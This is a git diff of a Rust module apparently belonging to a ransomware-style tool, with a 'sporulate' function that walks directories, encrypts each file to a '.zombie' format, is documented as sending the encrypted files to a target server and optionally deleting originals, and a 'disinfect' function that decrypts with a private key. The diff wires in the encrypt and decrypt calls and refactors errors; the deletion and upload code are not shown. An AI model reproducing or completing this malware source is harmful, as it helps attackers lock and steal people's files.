@@ -3,12 +3,15 @@
 
 use log::{debug, info};
 use std::collections::HashSet;
-// use std::fs;
-use std::io::{Error, ErrorKind};
-use std::path::PathBuf;
+// use std::fs;  // for file deletion
+use std::io::{self, ErrorKind};
+use std::path::Path;
 use walkdir::WalkDir;
 
-use crate::crypto::{EXTENSION, decrypt, encrypt};
+use crate::{
+    crypto::{EXTENSION, decrypt, encrypt},
+    error::AppError,
+};
 
 // Rust lifetimes make me wanna cry--pun intended
 // Slices are used to avoid informing the number of elements of an array
@@ -34,13 +37,16 @@ const EXCLUDED_FILES: &'static [&'static str] = &[".dmg", ".tmp", ".DS_Store"];
 ///   - Sends the encrypted file to the target server
 ///   - Optinally, deletes the original file locally
 pub fn sporulate(
-    path: PathBuf,
-    no_delete: bool,
-    server: String,
-    target_folder: Option<String>,
-) -> Result<(), Error> {
+    path: &Path,
+    no_delete: &bool,
+    server: &String,
+    target_folder: &Option<String>,
+) -> Result<(), AppError> {
     if !path.exists() {
-        return Err(Error::new(ErrorKind::NotFound, "Path does not exist"));
+        return Err(AppError::Io(io::Error::new(
+            ErrorKind::NotFound,
+            format!("Path not found: {:?}", path),
+        )));
     }
     let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
     let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();
@@ -100,15 +106,22 @@ pub fn sporulate(
 
             // Encrypt enters here
             debug!("Encrypting file: {:?}", file_path);
-            encrypt()?;
-            // Success:
-            //debug!("File encrypted: {:?}, size = {} bytes", file_path, file_size);
-            // Error:
-            //error!("Failed to encrypt file: {:?}, error = {:?}", file_path, err);
+            encrypt(file_path)?;
+            // TODO: Possibly, I'll have to handle errors at this
+            // level to prevent from breaking when encryption fails:
+            // match encrypt() {
+            //     Ok(encrypted_path) => {
+            //         debug!("File encrypted to: {:?}, size={} bytes", encrypted_path, file_size);
+            //     }
+            //     Err(err) => {
+            //         error!("Failed to encrypt file: {:?}, error={:?}", file_path, err);
+            //     }
+            // }
 
             if !no_delete {
                 debug!("Deleting original file: {:?}", file_path);
                 // fs::remove_file(file_path)?;
+                // TODO: Test if it worked:
                 // Success:
                 // debug!();
                 // Error:
@@ -140,13 +153,19 @@ pub fn sporulate(
 ///   - Extracts the `.zombie` file header
 ///   - Uses the private key provided to decrypt the header
 ///   - Decrypts the content using the decrypted secret key and IV
-pub fn disinfect(path: PathBuf, key: PathBuf) -> Result<(), Error> {
+pub fn disinfect(path: &Path, key: &Path) -> Result<(), AppError> {
     if !path.exists() {
-        return Err(Error::new(ErrorKind::NotFound, "Path does not exist"));
+        return Err(AppError::Io(io::Error::new(
+            ErrorKind::NotFound,
+            format!("Path not found: {:?}", path),
+        )));
     }
 
     if !key.is_file() {
-        return Err(Error::new(ErrorKind::NotFound, "Key is not a valid file"));
+        return Err(AppError::Io(io::Error::new(
+            ErrorKind::NotFound,
+            format!("Key not found: {:?}", key),
+        )));
     }
 
     // Creates and sets the directory traversal lazy iterator.
@@ -161,16 +180,22 @@ pub fn disinfect(path: PathBuf, key: PathBuf) -> Result<(), Error> {
 
     info!(
         "Starting decryption process: path={:?}, key={:?}",
-        path, key
+        path, &key
     );
     for entry in walker {
         let file_path = entry.path();
         debug!("Decrypting file: {:?}", file_path);
-        decrypt()?;
-        // Success:
-        // debug!("File decrypted: {:?}, size={} bytes", decrypted_file, file_size);
-        // Error:
-        // debug!("Failed to decrypt file: {:?}, error={:?}", encrypted_file, err);
+        decrypt(file_path, key)?;
+        // TODO: Just like the encryption--I'll have to handle errors
+        // to log and continue if a decryption fails.
+        // match decrypt() {
+        //     Ok(decrypted_path) => {
+        //         debug!("File decrypted to: {:?}, size={} bytes", decrypted_path, file_size);
+        //     }
+        //     Err(err) => {
+        //         error!("Failed to decrypt file: {:?}, error={:?}", file_path, err);
+        //     }
+        // }
     }
 
     info!("Decryption process completed successfully: path={:?}", path);
